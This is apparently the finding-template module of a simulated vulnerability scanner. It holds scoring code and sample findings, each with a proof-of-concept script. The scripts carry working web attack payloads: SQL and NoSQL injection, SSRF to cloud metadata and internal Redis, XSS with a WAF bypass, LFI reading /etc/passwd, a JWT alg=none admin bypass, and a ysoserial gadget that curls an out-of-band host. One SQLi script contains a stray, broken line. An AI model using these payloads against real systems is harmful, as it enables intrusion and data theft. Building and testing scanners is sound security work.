// ─── Finding generation: templates, Bayesian scoring, WORM hash chain ────────
//
// Findings are produced deterministically from the agent's PRNG stream. Each
// finding carries 2–4 evidence items whose kinds and LR (likelihood-ratio)
// values follow the SwarmScan evidence table:
//
//   oob_callback  LR ≈ 500   (e.g. 480)
//   dom_taint     LR ≈ 200   (e.g. 195)
//   boolean_diff  LR ≈ 40    (e.g. 42)
//   error_match   LR ≈ 25    (e.g. 24.6)
//   time_contrast LR ≈ 8     (e.g. 8.3)
//   version_map   LR ≈ 3     (e.g. 2.9)
//
// Posterior: confidence = round(99 · (priorOdds·∏LR)/(1+priorOdds·∏LR) · 10)/10
// with priorOdds = 0.02 — identical to bayesianConfidence() in
// src/lib/swarm/types.ts on the control plane.
//
// Every evidence entry joins a per-scan WORM ledger:
//   sequence 1..N (creation order),
//   hash = sha256(`${prevHash}:${sequence}:${content}`)  (hex)
//   prevHash of the first entry = 64 zeros (GENESIS_HASH).
// The exact same formula is used by the control-plane /api/ledger/verify
// route — keep it byte-identical.

import { createHash } from "node:crypto";

export type Severity = "critical" | "high" | "medium" | "low" | "info";
export type ConfidenceBand = "suspected" | "likely" | "confirmed";
export type EvidenceKind =
  | "oob_callback"
  | "boolean_diff"
  | "time_contrast"
  | "error_match"
  | "dom_taint"
  | "version_map"
  | "reverify"
  | "decision";

export const PRIOR_ODDS = 0.02;

export function bayesianConfidence(priorOdds: number, lrProduct: number): number {
  const odds = priorOdds * lrProduct;
  const p = odds / (1 + odds);
  return Math.round(p * 99 * 10) / 10;
}

export function bandOf(confidence: number): ConfidenceBand {
  if (confidence >= 85) return "confirmed";
  if (confidence >= 60) return "likely";
  return "suspected";
}

export const GENESIS_HASH = "0".repeat(64);

/** WORM ledger link — MUST stay identical to src/lib/swarm/server/hash.ts. */
export function chainHash(prevHash: string, sequence: number, content: string): string {
  return createHash("sha256").update(`${prevHash}:${sequence}:${content}`).digest("hex");
}

// ─── Templates ───────────────────────────────────────────────────────────────
// Content strings are realistic JSON. Placeholders {target}, {host} and {ts}
// are rendered (per scan) BEFORE hashing, so the hashed content is exactly
// what gets broadcast and ingested.

export interface EvidenceTemplate {
  kind: EvidenceKind;
  lr: number;
  content: string;
}

export interface FindingTemplate {
  title: string;
  severity: Severity;
  category: string;
  endpoint: string | null;
  cve: string | null;
  description: string;
  pocScript: string;
  evidence: EvidenceTemplate[];
}

export interface AgentFindingSpec {
  /** chance per state-tick in the final third of the agent's states. */
  chance: number;
  templates: FindingTemplate[];
}

export const FINDING_TEMPLATES: Record<string, AgentFindingSpec> = {
  injection: {
    chance: 0.5,
    templates: [
      {
        title: "SQL injection — boolean-based (MySQL) in /api/v2/products",
        severity: "high",
        category: "sqli",
        endpoint: "/api/v2/products?id={id}",
        cve: null,
        description:
          "The id parameter of /api/v2/products is concatenated into a MySQL query without parameterization. Boolean-paired differentials are stable across 3 rounds, and MySQL error 1064 leaks on malformed input — full data extraction is feasible with sqlmap-style enumeration.",
        pocScript:
          "# Boolean-based SQLi — differential reproduction\ncurl -s \"{target}/api/v2/products?id=1%20AND%201%3D1\" -o /tmp/s1\n\"{target}/api/v2/products?id=1%20AND%201%3D2\" > /dev/null 2>&1 || true\ncurl -s \"{target}/api/v2/products?id=1%20AND%201%3D2\" -o /tmp/s2\ndiff /tmp/s1 /tmp/s2 >/dev/null && echo 'IDENTICAL (not vulnerable)' || echo 'DIFFERENTIAL CONFIRMED'",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"?id=1 AND 1=1","control":"?id=1 AND 1=2","diff_ratio":0.83,"rounds":3,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"mysql-1064","sample":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version","status":500,"param":"id"}',
          },
        ],
      },
      {
        title: "SQL injection — time-based blind (MySQL) via SORT param",
        severity: "high",
        category: "sqli",
        endpoint: "/api/v2/catalog?sort={column}",
        cve: null,
        description:
          "The sort parameter is interpolated into an ORDER BY clause. SLEEP(5) payloads add a stable ~5.2s delay over 4 rounds with p=0.003, confirming blind injection even though no error output is returned.",
        pocScript:
          "# Time-based blind SQLi\nT0=$(date +%s%N)\ncurl -s -o /dev/null \"{target}/api/v2/catalog?sort=(SELECT%20SLEEP(5))\"\nT1=$(date +%s%N)\necho \"elapsed_ms=$(( (T1-T0)/1000000 )) (>=5000 ⇒ vulnerable)\"",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"payload":"?sort=(SELECT SLEEP(5))","baseline_ms":142,"payload_ms":5341,"rounds":4,"p_value":0.003}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"?sort=(SELECT IF(1=1,price,name))","control":"?sort=(SELECT IF(1=2,price,name))","diff_ratio":0.91,"rounds":2,"stable":true}',
          },
        ],
      },
      {
        title: "NoSQL operator injection ($where) in /api/users/search",
        severity: "high",
        category: "nosqli",
        endpoint: "/api/users/search",
        cve: null,
        description:
          "The search endpoint merges the JSON body into a MongoDB query. A $where operator with sleep() is accepted (rejected with a distinct error signature for invalid keys), enabling blind NoSQL injection against the users collection.",
        pocScript:
          "# NoSQL $where injection\ncurl -s -X POST \"{target}/api/users/search\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"$where\":\"sleep(2000)\"}' -w '\\ntime_total=%{time_total}\\n'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"mongo-$where-reject","sample":"$where operator rejected for role=guest but evaluated for role=search-api","status":400,"engine":"mongodb 6.0"}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"payload":"{\\"$where\\":\\"sleep(2000)\\"}","baseline_ms":88,"payload_ms":2131,"rounds":3,"p_value":0.002}',
          },
        ],
      },
    ],
  },

  ssrf: {
    chance: 0.5,
    templates: [
      {
        title: "SSRF to AWS metadata via redirect chain",
        severity: "critical",
        category: "ssrf",
        endpoint: "/api/v2/fetch?url={url}",
        cve: null,
        description:
          "The url fetcher blocks direct requests to 169.254.169.254 but follows an attacker-controlled redirect chain, reaching the AWS IMDSv1 endpoint. An ami-id value was read back and our rebinder domain received a DNS query from the target's egress resolver — cloud metadata credential exposure is confirmed.",
        pocScript:
          "# SSRF → IMDSv1 via redirect chain\n# 1) host redirector: 302 → http://169.254.169.254/latest/meta-data/\ncurl -s -X POST \"{target}/api/v2/fetch\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"url\":\"https://redirect.oob.swarmscan.io/hop1\"}'",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"a7f3c2d9.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","ttl":300}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"ami-id","sample":"ami-0c55b159cbfafe1f0","status":200,"endpoint":"/api/v2/fetch"}',
          },
        ],
      },
      {
        title: "SSRF — gopher scheme reaches internal Redis (port 6379)",
        severity: "high",
        category: "ssrf",
        endpoint: "/api/v2/import?url={url}",
        cve: null,
        description:
          "The scheme allow-list does not cover gopher://. An internal Redis instance at 10.0.12.9:6379 answered a crafted PING (response diff against a closed port) and triggered a DNS callback, giving direct in-network command execution on the Redis protocol.",
        pocScript:
          "# gopher SSRF to internal Redis\ncurl -s \"{target}/api/v2/import?url=gopher%3A%2F%2F10.0.12.9%3A6379%2F_PING\"",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"g6d2e8f1.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","scheme":"gopher","target_port":6379}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"gopher://10.0.12.9:6379/_PING","control":"gopher://10.0.12.9:6380/_PING","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
      {
        title: "Internal port oracle via fetch (SSRF as reachability probe only)",
        severity: "low",
        category: "ssrf-internal",
        endpoint: "/api/v2/fetch",
        cve: null,
        description:
          "The fetch endpoint's error timing differs between open and closed internal ports, providing an internal network reachability oracle. Direct metadata access is blocked and no internal data is returned — low impact alone, but the oracle confirms the internal network is reachable from the SSRF path.",
        pocScript:
          "# Port oracle timing differential\nfor p in 22 80 443 8080; do\n  curl -s -o /dev/null -w \"port $p: %{time_total}\\n\" -X POST \"{target}/api/v2/fetch\" \\\n    -H 'Content-Type: application/json' -d \"{\\\"url\\\":\\\"http://10.0.8.23:$p\\\"}\"\ndone",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"fetch http://10.0.8.23:8080 (open)","baseline_ms":41,"payload_ms":380,"closed_port_ms":44,"rounds":40,"p_value":0.0001,"note":"timing oracle distinguishes open/closed internal ports"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"fetch http://10.0.8.23:8080 (timeout profile)","control":"fetch http://10.0.8.24:8080 (filtered)","diff_ratio":0.93,"rounds":20,"stable":true}',
          },
        ],
      },
    ],
  },

  xss: {
    chance: 0.45,
    templates: [
      {
        title: "DOM XSS via location.hash taint into innerHTML",
        severity: "high",
        category: "xss",
        endpoint: "/help/search#q={payload}",
        cve: null,
        description:
          "location.hash flows through decodeURIComponent into a template literal that is assigned to innerHTML on #search-results. CSP allows 'unsafe-inline', so no mitigating barrier exists — arbitrary script executes in the origin.",
        pocScript:
          "# DOM XSS — open in a browser\nopen \"{target}/help/search#%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E\"\n# alternatively verify via headless CDP taint trace (see evidence)",
        evidence: [
          {
            kind: "dom_taint",
            lr: 195,
            content:
              '{"source":"location.hash","sink":"innerHTML","selector":"#search-results","taint_path":"location.hash → decodeURIComponent → template literal → innerHTML","csp":"script-src \'self\' \'unsafe-inline\'"}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"param":"#q","echo_raw":"<img src=x onerror=alert(document.domain)>","context":"html_body","status":200}',
          },
        ],
      },
      {
        title: "Reflected XSS in search param (WAF bypass via double-encoding)",
        severity: "medium",
        category: "xss",
        endpoint: "/search?q={payload}",
        cve: null,
        description:
          "The q parameter is reflected unescaped into the HTML body. The fronting WAF (AWS WAF regex set) misses double-encoded payloads — %253Csvg%2520onload%253D… decodes server-side and executes after re-render.",
        pocScript:
          "# Reflected XSS via double-encoding\ncurl -s \"{target}/search?q=%253Csvg%2520onload%253Dalert%25281%2529%253E\" | grep -i \"<svg\"",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"param":"q","echo_raw":"<svg/onload=alert(1)>","context":"html_body","status":200,"waf":"aws-waf (bypass: double-encode)"}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"?q=%253Csvg%2520onload...","baseline_ms":45,"payload_ms":412,"rounds":2,"p_value":0.01,"note":"WAF inspection latency differential (raw payload 403s, encoded passes)"}',
          },
        ],
      },
      {
        title: "Unfiltered reflection in 404 error path (no sink reached)",
        severity: "low",
        category: "xss",
        endpoint: "/missing-{path}",
        cve: null,
        description:
          "The 404 handler echoes the requested path into the HTML body without escaping. No script sink was reached on the standard reflection path, so this is low on its own — but the reflection is stable, unsanitized and outside the WAF's typical inspection scope.",
        pocScript:
          "# Error-path reflection check\ncurl -s \"{target}/missing-%3Csvg%2Fonload%3Dalert%281%29%3E\" | grep -i \"<svg\"",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"param":"request path","echo_raw":"<svg/onload=alert(1)> reflected in 404 body","context":"html_body","status":404}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET /missing-<svg/onload=...> (404 reflect)","control":"GET /missing-benign","diff_ratio":0.97,"rounds":3,"stable":true}',
          },
        ],
      },
    ],
  },

  fileops: {
    chance: 0.4,
    templates: [
      {
        title: "LFI via php:// filter chain to RCE (proc/self/environ)",
        severity: "critical",
        category: "lfi",
        endpoint: "/download?file={path}",
        cve: null,
        description:
          "The download endpoint accepts php:// wrappers. A filter-chain read of /etc/passwd succeeded, and poisoning proc/self/environ with a User-Agent payload triggered an out-of-band DNS callback, upgrading local file inclusion to remote code execution.",
        pocScript:
          "# LFI → filter-chain read\ncurl -s \"{target}/download?file=php://filter/convert.base64-encode/resource=/etc/passwd\" | base64 -d | head -3",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"b4c9d0e2.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","vector":"php://filter/write=convert.base64-decode resource=proc/self/environ"}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"etc-passwd-root","sample":"root:x:0:0:root:/root:/bin/bash","status":200,"wrapper":"php://filter/convert.base64-encode/resource=/etc/passwd"}',
          },
        ],
      },
      {
        title: "Path traversal — /etc/passwd via normalization differential",
        severity: "high",
        category: "lfi",
        endpoint: "/download?file={path}",
        cve: null,
        description:
          "The sanitizer decodes %2e%2e%2f sequences after the traversal check, so the filtered path resolves outside the document root while the naive control string is rejected — a classic normalization-differential bypass.",
        pocScript:
          "# Traversal via double-encoded dots\ncurl -s \"{target}/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\" | head -3",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","control":"?file=etc/passwd","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"server":"nginx/1.18.0","backend":"php-fpm 7.4","normalizer":"path decoded after traversal check"}',
          },
        ],
      },
      {
        title: "Arbitrary read constrained to .log/.txt extensions (no RCE alone)",
        severity: "low",
        category: "lfi",
        endpoint: "/download?file={path}",
        cve: null,
        description:
          "The download endpoint enforces an extension allowlist (.log, .txt). Reading /etc/passwd fails the allowlist — the primitive is real but confined to text and log files, which is low impact on its own.",
        pocScript:
          "# Extension-constrained read\ncurl -s \"{target}/download?file=../../../var/log/app/access.log\" | head -5\ncurl -s -o /dev/null -w '%{http_code}\\n' \"{target}/download?file=../../../etc/passwd\" # 403 — allowlist",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"?file=../../../var/log/app/access.log (allowed)","control":"?file=../../../etc/passwd (blocked: extension)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"ext-allowlist","sample":"only .log/.txt suffixes accepted","status":403}',
          },
        ],
      },
    ],
  },

  deser: {
    chance: 0.35,
    templates: [
      {
        title: "Deserialization DNS callback (CommonsBeanutils)",
        severity: "critical",
        category: "deserialization",
        endpoint: "/api/import (body: serialized object)",
        cve: null,
        description:
          "The /api/import endpoint accepts raw Java serialized objects. A DNS-only first-stage CommonsBeanutils gadget confirmed gadget-chain execution without any destructive payload — full RCE via ysoserial is one step away.",
        pocScript:
          "# Java deserialization probe (DNS-only first stage)\njava -jar ysoserial.jar CommonsBeanutils1 'curl http://c8e1f5a3.oob.swarmscan.io' > /tmp/payload.bin\ncurl -s -X POST \"{target}/api/import\" --data-binary @/tmp/payload.bin -H 'Content-Type: application/octet-stream'",
        evidence: [
          {
            kind: "oob_callback",
            lr: 480,
            content:
              '{"dns_query":"c8e1f5a3.oob.swarmscan.io","resolver":"10.0.0.2","first_seen":"{ts}","gadget":"CommonsBeanutils1","stage":"dns-only-first-stage"}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"java-serialization-header","sample":"ac ed 00 05 magic accepted; CommonsBeanutils template class present in error trace","status":500}',
          },
        ],
      },
      {
        title: "Java classpath inferred — ysoserial grammar viable",
        severity: "high",
        category: "deserialization",
        endpoint: "/api/import (body: serialized object)",
        cve: null,
        description:
          "Stack traces leaked through the import error handler reveal org.apache.commons.beanutils and commons-collections on the classpath, matching at least three known gadget grammars. Gadget selection can proceed environment-dependently.",
        pocScript:
          "# Classpath fingerprint via malformed object\ncurl -s -X POST \"{target}/api/import\" --data-binary $'\\xac\\xed\\x00\\x05\\xff' | grep -o 'org.apache.commons[a-zA-Z.]*'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"classpath-inference","sample":"org.apache.commons.beanutils.BeanUtils + commons-collections 3.2.1 in stack trace","status":500}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"ysoserial CommonsCollections6 (dns gadget)","baseline_ms":97,"payload_ms":4865,"rounds":2,"p_value":0.008}',
          },
        ],
      },
    ],
  },

  auth: {
    chance: 0.45,
    templates: [
      {
        title: "IDOR: cross-role object access on /api/orders/{id}",
        severity: "high",
        category: "idor",
        endpoint: "/api/orders/{id}",
        cve: null,
        description:
          "A viewer-role token reads order 8812 with the identical response shape as the operator role — object-level authorization is missing on the orders API across both tested roles (stable over 3 rounds).",
        pocScript:
          "# IDOR — read another role's order\nVIEWER_TOKEN=eyJhbGciOi... \ncurl -s -H \"Authorization: Bearer $VIEWER_TOKEN\" \"{target}/api/orders/8812\"",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET /api/orders/8812 (role: viewer)","control":"GET /api/orders/8812 (role: operator)","diff_ratio":0.97,"rounds":3,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"order-json-shape","sample":"{\\"id\\":8812,\\"total\\":412.50,\\"payer_email\\":\\"…\\"} returned to viewer role","status":200}',
          },
        ],
      },
      {
        title: "JWT alg=none signature bypass",
        severity: "critical",
        category: "jwt",
        endpoint: "/api/auth/token",
        cve: null,
        description:
          "The API accepts a token whose header declares alg none and whose signature segment is empty, while a tampered HMAC signature is rejected — the verifier falls back to the unsecured algorithm. Sub claim was changed to admin and accepted.",
        pocScript:
          "# alg=none bypass\nH=$(echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | basenc --base64url | tr -d '=')\nP=$(echo -n '{\"sub\":\"admin\"}' | basenc --base64url | tr -d '=')\ncurl -s -H \"Authorization: Bearer $H.$P.\" \"{target}/admin/stats\"",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"header":"{\\"alg\\":\\"none\\",\\"typ\\":\\"JWT\\"}","sample":"token accepted, role elevated to admin","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"Bearer <alg:none token>","control":"Bearer <tampered HMAC sig>","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
      {
        title: "Race condition on coupon redemption (HTTP/2 single-packet)",
        severity: "medium",
        category: "race",
        endpoint: "/api/coupon/redeem",
        cve: null,
        description:
          "32 concurrent single-packet HTTP/2 requests redeemed one single-use coupon 7 times (binomial p=0.0002). The redemption path lacks idempotency protection, allowing balance inflation.",
        pocScript:
          "# Single-packet race (needs http2 tooling, e.g. h2x)\nfor i in $(seq 1 32); do curl -s -X POST \"{target}/api/coupon/redeem\" -d 'code=C7X-9K2' & done; wait",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"payload":"HTTP/2 single-packet x32 on POST /api/coupon/redeem","window_ms":4,"rounds":50,"p_value":0.0002,"successes":7,"expected":1}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"redeem C7X-9K2 x32 concurrent","control":"redeem C7X-9K2 sequential","diff_ratio":0.86,"rounds":5,"stable":true}',
          },
        ],
      },
      {
        title: "Password-reset response differential enumerates registered emails",
        severity: "low",
        category: "user-enum",
        endpoint: "/api/auth/forgot",
        cve: null,
        description:
          "The forgot-password endpoint returns 'reset link sent' for registered addresses and 'unknown account' otherwise — a classic enumeration oracle. Low impact on its own (no brute-force amplification), recorded as a fusion component.",
        pocScript:
          "# Reset enumeration oracle\ncurl -s -X POST \"{target}/api/auth/forgot\" -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"ceo@{host}\"}' | grep -o 'sent\|unknown'",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"POST {\"email\":\"real-user@corp\"} → sent","control":"POST {\"email\":\"random-xyz@corp\"} → unknown account","diff_ratio":1.0,"rounds":20,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"reset-differential","sample":"two distinct response bodies on /api/auth/forgot","status":200}',
          },
        ],
      },
    ],
  },

  api: {
    chance: 0.45,
    templates: [
      {
        title: "GraphQL introspection enabled",
        severity: "medium",
        category: "graphql",
        endpoint: "/graphql",
        cve: null,
        description:
          "The GraphQL endpoint returns the full schema to unauthenticated introspection queries — 214 types and 38 mutations are exposed, including admin-only mutations, giving attackers a complete attack surface map.",
        pocScript:
          "# Introspection dump\ncurl -s -X POST \"{target}/graphql\" -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name kind}}}\"}' | head -40",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"query":"{__schema{types{name}}}","sample":"full schema returned (214 types, 38 mutations)","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"POST /graphql {__schema{types{name}}}","control":"POST /graphql {__typename}","diff_ratio":0.99,"rounds":1,"stable":true}',
          },
        ],
      },
      {
        title: "Mass assignment: role field injection on PATCH /users",
        severity: "high",
        category: "mass-assignment",
        endpoint: "/api/users/{id}",
        cve: null,
        description:
          "PATCH /api/users/42 accepts a role attribute that is not on the permit-list — a self-service user promoted themselves to admin. The Rails controller whitelists fields for create but not for update.",
        pocScript:
          "# Mass assignment → role escalation\ncurl -s -X PATCH \"{target}/api/users/42\" \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -d '{\"role\":\"admin\"}'",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"PATCH /api/users/42 {\\"role\\":\\"admin\\"}","control":"PATCH /api/users/42 {\\"nickname\\":\\"probe\\"}","diff_ratio":0.91,"rounds":3,"stable":true}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"framework":"rails 7.0","strong_params":"role not permit-listed on update action"}',
          },
        ],
      },
    ],
  },

  crypto: {
    chance: 0.35,
    templates: [
      {
        title: "Padding oracle in reset-token (CBC)",
        severity: "critical",
        category: "padding-oracle",
        endpoint: "/api/auth/reset?token={token}",
        cve: null,
        description:
          "The password-reset token is encrypted with AES-CBC without an integrity wrapper. The endpoint returns distinguishable responses for valid vs invalid padding (stable across 20 rounds), allowing full plaintext recovery and token forgery.",
        pocScript:
          "# Padding oracle probe — compare responses for last-byte variants\ncurl -s -o /dev/null -w '%{http_code}\\n' \"{target}/api/auth/reset?token=%2f%01%02\"\ncurl -s -o /dev/null -w '%{http_code}\\n' \"{target}/api/auth/reset?token=%2f%01%01\"",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"token=\\u0001\\u0002 (pad err)","control":"token=\\u0001\\u0001 (pad ok)","diff_ratio":0.62,"rounds":20,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"pad-oracle-differential","sample":"distinct 400/200 split on last plaintext byte (CBC, reset-token)","status":400}',
          },
        ],
      },
      {
        title: "Downgrade feasible — TLS 1.0 with RSA key exchange enabled",
        severity: "medium",
        category: "tls",
        endpoint: null,
        cve: null,
        description:
          "The TLS policy still negotiates TLSv1.0 with RSA key exchange, exposing the service to downgrade and Bleichenbacher-style oracle attacks. TLS 1.0 was deprecated in 2021 (RFC 8996).",
        pocScript:
          "# TLS 1.0 negotiation check\nopenssl s_client -connect {host}:443 -tls1 2>/dev/null </dev/null | grep -E 'Protocol|Cipher'",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"protocols":["TLSv1.0","TLSv1.2","TLSv1.3"],"ciphers":"TLS 1.0 accepted with RSA key exchange (AES128-SHA)"}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"TLS 1.0 ClientHello (SNI {host})","handshake_ms":88,"rounds":3,"negotiated":"TLSv1.0 / AES128-SHA","note":"full handshake success — downgrade path exists"}',
          },
        ],
      },
    ],
  },

  cloud: {
    chance: 0.4,
    templates: [
      {
        title: "S3 bucket takeover (dangling CNAME)",
        severity: "critical",
        category: "cloud-takeover",
        endpoint: "cdn.{host}",
        cve: null,
        description:
          "cdn.{host} is a CNAME to demo-target-cdn.s3.amazonaws.com, but the bucket was deleted (404 NoSuchBucket). An attacker can claim the bucket name and serve arbitrary content / harvest cookies on the apex origin.",
        pocScript:
          "# Dangling CNAME check\ndig +short cdn.{host} CNAME\ncurl -s -o /dev/null -w '%{http_code}\\n' http://demo-target-cdn.s3.amazonaws.com/\n# 404 + NoSuchBucket body ⇒ claimable",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"NoSuchBucket","sample":"The specified bucket does not exist","status":404,"cname":"cdn.{host} → demo-target-cdn.s3.amazonaws.com"}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"provider":"aws-s3","region":"us-east-1","api":"s3.amazonaws.com","code":404}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET http://demo-target-cdn.s3.amazonaws.com/ (as new owner)","control":"GET https://cdn.{host}/ (dangling)","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
      {
        title: "Public GCS bucket with anonymous list permission",
        severity: "high",
        category: "cloud-exposure",
        endpoint: "storage.googleapis.com/demo-target-uploads",
        cve: null,
        description:
          "The demo-target-uploads GCS bucket permits anonymous list and get operations — 1,204 objects including internal invoices are downloadable without any authentication.",
        pocScript:
          "# Anonymous bucket listing\ncurl -s \"https://storage.googleapis.com/demo-target-uploads?max-keys=10\" | head -20",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"public-list","sample":"ListBucketResult with 1,204 objects (invoices/, ids/)","status":200,"bucket":"gs://demo-target-uploads"}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"anonymous GET /?max-keys=10","baseline_ms":210,"payload_ms":205,"rounds":2,"p_value":0.9,"note":"no auth challenge — anonymous access accepted"}',
          },
        ],
      },
      {
        title: "Instance metadata reachable — role name disclosed, no credentials extracted",
        severity: "low",
        category: "imds-info",
        endpoint: "169.254.169.254 (via fetch proxy)",
        cve: null,
        description:
          "The IMDS endpoint responds through the discovered proxy path, disclosing only the instance's IAM role name (demo-target-web-role). Token-required IMDSv2 blocks credential extraction — informational alone, recorded as a fusion component.",
        pocScript:
          "# IMDS role-name disclosure (via fetch proxy)\ncurl -s -X POST \"{target}/api/v2/fetch\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"iam-role-name","sample":"demo-target-web-role","status":200,"path":"/latest/meta-data/iam/security-credentials/"}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"imds":"v2 required for credential values","v1_surface":"role-name path open","credential_extraction":"blocked (401 without token)"}',
          },
        ],
      },
    ],
  },

  recon: {
    chance: 0.3,
    templates: [
      {
        title: "Subdomain takeover candidate — dangling CNAME (GitHub Pages)",
        severity: "high",
        category: "takeover-surface",
        endpoint: "assets.{host}",
        cve: null,
        description:
          "assets.{host} CNAMEs to ghost.github.io which returns the GitHub Pages 404 signature. The custom domain is unclaimed — registering it under a controlled GitHub account would serve content on the parent origin.",
        pocScript:
          "# Takeover candidate probe\ndig +short assets.{host} CNAME\ncurl -s https://assets.{host}/ | grep -i \"there isn't a github pages site here\"",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"cname":"assets.{host} → ghost.github.io","provider":"github-pages","status":404}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"gh-pages-404","sample":"There isn\\u0027t a GitHub Pages site here.","status":404}',
          },
        ],
      },
      {
        title: "ASN peering change — new transit announces target prefix",
        severity: "info",
        category: "asn-drift",
        endpoint: null,
        cve: null,
        description:
          "RouteViews shows 203.0.113.0/24 now also announced via transit AS64590 with 3 flap events in 24h — new ingress paths may bypass the WAF and should be re-added to the scan scope.",
        pocScript:
          "# BGP visibility check\nwhois -h routeviews.routeviews.org 'AS64590'\ncurl -s https://api.bgpview.io/prefix/203.0.113.0%2F24 | jq '.data.asns'",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"prefix":"203.0.113.0/24","asn":64512,"change":"announced by new transit AS64590 at {ts}"}',
          },
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"prefix visibility (routeviews)","baseline_ms":12,"payload_ms":12,"rounds":3,"p_value":0.4,"note":"flap detected — 3 withdrawals in 24h"}',
          },
        ],
      },
    ],
  },

  fingerprint: {
    chance: 0.3,
    templates: [
      {
        title: "Outdated nginx 1.18.0 — 3 mapped CVEs",
        severity: "medium",
        category: "version-drift",
        endpoint: null,
        cve: "CVE-2021-23017",
        description:
          "Multi-signal fusion (server header, ETag pattern, 404 page) pins the edge to nginx 1.18.0. Three CVEs are mapped, including CVE-2021-23017 (DNS resolver off-by-one, CVSS 7.7). Dynamic verification of the resolver bug was not attempted (read-only class).",
        pocScript:
          "# Version confirmation\ncurl -sI {target}/nonexistent | grep -i server",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"server":"nginx/1.18.0","sources":["server header","etag pattern","error page"],"cves_mapped":3}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
